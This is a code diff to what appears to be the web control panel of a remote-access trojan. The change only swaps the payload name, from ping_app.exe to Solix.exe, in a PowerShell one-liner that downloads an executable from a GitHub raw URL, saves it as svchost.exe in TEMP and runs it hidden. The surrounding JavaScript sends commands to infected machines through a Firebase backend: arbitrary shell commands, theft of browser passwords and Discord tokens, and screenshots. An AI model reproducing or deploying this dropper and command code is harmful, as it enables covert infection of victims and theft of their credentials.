@@ -293,7 +293,7 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
     </div>
     <div class="install-cmd" id="buildCmdDisplay">
       <span class="lbl"># PowerShell deploy:</span>
-      <div id="buildCmdText" style="margin-top:.2rem">iwr -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span class="cmd">"$env:TEMP\svchost.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\svchost.exe"</span></div>
+      <div id="buildCmdText" style="margin-top:.2rem">iwr -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/Solix.exe"</span> -OutFile <span class="cmd">"$env:TEMP\svchost.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\svchost.exe"</span></div>
       <button class="cp" onclick="copyBuildCmd()">Copy</button>
     </div>
   </div>
@@ -478,7 +478,7 @@ async function quickSS(n){try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{meth
 async function quickCmd(n){const cmd=prompt('Command for '+n+':');if(!cmd)return;try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cmd',payload:cmd,status:'pending'})});toast('Command sent to '+n)}catch{}}
 async function quickBW(n){try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'browser_passwords',payload:'',status:'pending'})});toast('Browser password request sent to '+n)}catch{}}
 async function quickTokens(n){try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'discord_tokens',payload:'',status:'pending'})});toast('Token grab requested for '+n)}catch{}}
-function downloadClient(){window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe'}
+function downloadClient(){window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/Solix.exe'}
 async function removeClient(n){
   if(!confirm('Remove '+n+' and all its data?'))return;
   try{await fetch(FB+'/pings/'+fbEsc(n)+'.json',{method:'DELETE'});await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'DELETE'});await fetch(FB+'/live/'+fbEsc(n)+'.json',{method:'DELETE'});toast('Removed '+n);load()}catch{}
@@ -699,7 +699,7 @@ function buildArgs(){
 }
 function updateBuildCmd(){
   const a=buildArgs();
-  document.getElementById('buildCmdText').innerHTML='iwr -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span class="cmd">"$env:TEMP\\svchost.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\\svchost.exe"</span>'+esc(a);
+  document.getElementById('buildCmdText').innerHTML='iwr -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/Solix.exe"</span> -OutFile <span class="cmd">"$env:TEMP\\svchost.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\\svchost.exe"</span>'+esc(a);
 }
 function copyBuildCmd(){
   const t=document.getElementById('buildCmdText').textContent;
